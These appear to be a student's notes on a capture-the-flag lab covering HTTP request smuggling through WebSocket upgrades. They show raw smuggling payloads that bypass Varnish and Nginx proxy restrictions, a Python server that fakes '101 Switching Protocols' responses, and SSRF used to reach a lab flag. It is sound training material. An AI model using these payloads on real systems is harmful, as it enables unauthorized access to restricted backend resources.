###### Objectives
- Understand WebSockets
- Learn to exploit HTTP request smuggling via WebSockets functionality
- Use tools to detect/exploit said vulnerabilities
https://github.com/0ang3el/websocket-smuggle
## What is a WebSocket
When using HTTP, the client must make a request before the server can send any information. This complicates the implementation of some application features that require bidirectional communications. Suppose you are implementing a web application that needs to send real-time notification's to users... Since the server can't push information to the user at will, the client would need to constantly poll the server for notifications, requiring a lot of wasted requests.

The WebSocket protocol allows the creation of two-way communication channels between a browser and a server by establishing a long-lasting connection that can be used for full-duplex communications.

Upgrading HTTP connections to Websockets

The WebSocket protocol was designed to be fully compatible with HTTP. Establishing a WebSocket connection follows a process similar to that of h2c (see the [HTTP/2 request smuggling](https://tryhackme.com/room/http2requestsmuggling) room for details). The client sends an initial HTTP request with an `Upgrade: websocket` header and other additional headers. If the server supports WebSockets, it responds with a `101 Switching Protocols` response and upgrades the connection accordingly. From that point onwards, the connection uses the WebSocket protocol instead of HTTP.

![WebSocket upgrade handshake](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b638a96cce16359712537e231d615db8.svg)  

If we now add a proxy in the middle, something interesting happens: Instead of fronting the connections themselves, most proxies won't handle the upgrade but will instead relay them to the backend server. Once the connection is upgraded, the proxy will establish a tunnel between the client and server, so any further WebSocket traffic is forwarded without interruptions.

![WebSocket upgrade through a proxy](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8d1983da6c30092b558ea2c724c00ddb.svg)  

The problem we now face is that the tunnel uses the WebSocket protocol instead of HTTP. If we were to attempt to smuggle an HTTP request using this tunnel, the backend server would reject it as it expects WebSocket requests.

**Which status code signals a successful WebSocket upgrade?**
> `101`


## Smuggling HTTP requests through broken WebSocket Tunnels
To smuggle requests through a vulnerable proxy, we can create a malformed request such that the proxy thinks a WebSocket upgrade is performed, but the backend server doesn't really upgrade the connection. 
- This will force the proxy into establishing a tunnel between client and server that will go unchecked since it assumes it is now a WebSocket connection, but the backend will still expect HTTP traffic.

One way to force this it to send an upgrade request with an invalid `Sec-WebSocket-Version` header. This header is used to specify the version of the WebSocket protocol to use and will normally take the value of `13` in most current WebSocket implementations. If the server supports the requested version, it should issue a `101 Switching Protocols` response and upgrade the connection.

But we aren't interested in upgrading the connection. If we send an unsupported value for the `Sec-Websocket-Version` header, the server will send a `426 Upgrade Required` response to indicate the upgrade was unsuccessful:

![Websocket upgrade with invalid version number](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7d307664d2f79553e2843c032caf4677.svg)  

Some proxies may assume that the upgrade is always completed, regardless of the server response. This can be abused to smuggle HTTP requests once again by performing the following steps:

1. The client sends a WebSocket upgrade request with an **invalid** version number.
2. The proxy forwards the request to the backend server.
3. The backend server responds with `426 Upgrade Required`. The connection doesn't upgrade, so the backend remains using HTTP instead of switching to a WebSocket connection.
4. The proxy doesn't check the server response and assumes the upgrade was successful. Any further communications will be tunnelled since the proxy believes they are part of an upgraded WebSocket connection.

![Tricking the proxy by using an invalid WebSocket version number](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/912ae5a26d8b060d71524216b0b0db2b.svg)  

It is important to note that this technique won't allow us to poison other users' backend connections. We will be limited to tunnelling requests through the proxy only, so we can bypass any restrictions imposed by the frontend proxy by using this trick.

Bypassing Proxy Restrictions

Let's check the application at `http://10.10.194.170:8001/flag`. This application is running behind a **Varnish** proxy with a vulnerable configuration. Our objective in this application is to retrieve the value stored in `/flag`.

As a first attempt, if we try to access `/flag` directly, we are presented with the following message:

![Flag is denied by the proxy](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d1e45e8a4802ccaa8026c1dc15ffe6ec.png)  

This error message was sent by Varnish (the proxy) instead of the backend application, which should be interesting. If we try accessing another non-existent resource like `http://10.10.194.170:8001/nonexistent134`, the error message presented will be different. At this point, we should be suspicious that the frontend proxy is restricting access to `/flag` in the backend web server.

Luckily, there's also a WebSocket endpoint we can abuse at `http://10.10.194.170:8001/socket`. Let's send the following payload to try to smuggle a request for the flag inside a broken WebSocket connection:

```shell
GET /socket HTTP/1.1
Host: 10.10.194.170:8001
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.10.194.170:8001

```

To send the request, we will use Burp's Repeater. To ensure Burp doesn't modify our request and break the attack, we need to make sure the `Update Content-Length` setting is disabled:

![Disabling Update Content-Length setting in Burp](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bb84fd50d49bd7c3e88397abcc0def9d.png)  

Once this is done, we can send our payload and should get the flag (note the two newlines at the end of the payload):

![Smuggling a request through WebSockets](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b1cf9c5f2251c60723a005819bcd36be.png)  

Just as expected, we get a `426` error from the initial attempt to upgrade the connection to a WebSocket. At this point, the proxy believes the rest of the connection uses the WebSocket protocol and will tunnel everything directly to the backend server, including our smuggled request for `/flag`.

What if the App Doesn't Speak WebSocket?

Note that some proxies will not even require the existence of a WebSocket endpoint for this technique to work. All we need is to fool the proxy into believing we are establishing a connection to a WebSocket, even if this isn't true. Look at what happens if you try to send the following payload (be sure to add two newlines after the payload in Burp):

```shell
GET / HTTP/1.1
Host: 10.10.194.170:8001
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.10.194.170:8001

```

This payload should still work, even though the first request is directed to `/`, which is not a WebSocket-enabled endpoint. The proxy simply doesn't check the response from the upgrade, so you can use any payload that looks close enough to a WebSocket upgrade.

**Note:** This payload will randomly fail when using Burp. You can either retry the payload a couple of times until it works, or deliver it by pasting it into a terminal running `nc 10.10.194.170 8001`, where it will work every time (don't forget the trailing newlines).

![[Pasted image 20240323210127.png]]

## Defeating Secure Proxies
So far, we've been working with a proxy that won't check the web server's response to determine whether the WebSocket upgrade was successful. In this task, we'll replace the vulnerable Varnish proxy with an Nginx proxy that checks responses before tunneling requests through a WebSocket Connection. The backend application will still have the `/socket` endpoint enabled with WebSockets and the `/flag` endpoint as our target.

The new application can be accessed via `http://10.10.194.170:8002/`.

First, let's try running the payload we used in the previous task to see if it works:

![Testing our payload with Nginx as a proxy](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ac9a19fb3a5fe25154482cf7c70368f6.png)  

Notice how Nginx won't leak the flag despite getting a `426` response for the initial WebSocket upgrade attempt. Since Nginx is checking the response code of the upgrade, it can determine that no valid WebSocket connection was established; therefore, it won't allow us to smuggle the `/flag` request.

### Tricking the Proxy

Since we can't just smuggle requests anymore, we need to find a way to trick the proxy into believing a valid WebSocket connection has been established. This means we need to somehow force the backend web server to reply to our upgrade request with a fake `101 Switching Protocols` response without actually upgrading the connection in the backend.

While we won't be able to do this for all applications, if our target app has some vulnerability that allows us to proxy requests back to a server we control as attackers, we might be able to inject the `101 Switching Protocols` response to an arbitrary request. In these special cases, we should be able to smuggle requests through a fake WebSocket connection again.

![Faking a websocket by leveraging SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3b58631ce8959364520fa9515f5aa49a.svg)  

### Leveraging SSRF

In this task's application, we will take advantage of an SSRF vulnerability to simulate a fake WebSocket upgrade. After a quick inspection, we can see that the application allows us to test the status of a URL. Each time we input a URL, the server will make a request to `http://10.10.194.170:8002/check-url?server=<url>` and return the status code from the corresponding response:

![Taking advantage of SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bbbb7b538ac6d66f6da36d6a655ada9d.png)  

We can use `nc` in our AttackBox to check if we can direct a request to ourselves. We should get a response similar to this one:

AttackBox

```shell-session
user@attackbox$ nc -lvp 5555
Listening on 0.0.0.0 5555
Connection received on 10.10.194.170 52988
GET /test HTTP/1.1
Host: 10.10.11.155:5555
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

This means we can successfully use the SSRF vulnerability to influence the response of the backend server. All we need to do is spin up a web server that returns a `101` status, allowing us to fake a WebSocket upgrade.

### Setting up the Attacker's Web Server

We can quickly set up a web server that responds with status 101 to every request with the following Python code:

```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

Let's save the code to a file named myserver.py in our AttackBox and run it with the following command:

```bash
user@attackbox$ python3 myserver.py 5555
```

This should spin up a web server on port 5555 that will reply with a 101 status code to any request.


### Faking a WebSocket

We are finally ready to launch our payload. Let's use Burp's Repeater to send a request to /check-url against our malicious server. The request should look like this:

```shell
GET /check-url?server=http://10.10.11.155:5555 HTTP/1.1
Host: 10.10.194.170:8002
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.10.194.170:8002

```

If all goes as expected, you should get a request in your malicious web server and the flag value in Burp (note that you need to add two newlines at the end of your payload in Burp):

![Smuggling a request through a fake websocket connection](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4c210998e9e3ff3cd2bbad3ed5d92fe7.png)  

Remember that `/check-url` is not a WebSocket endpoint. We are just manipulating both the request and response that the proxy gets to make it believe this is a real WebSocket. This means that the proxy will tunnel the second request in our payload as if it were part of a WebSocket connection, but the backend will just process the request as HTTP since there's no WebSocket in reality.
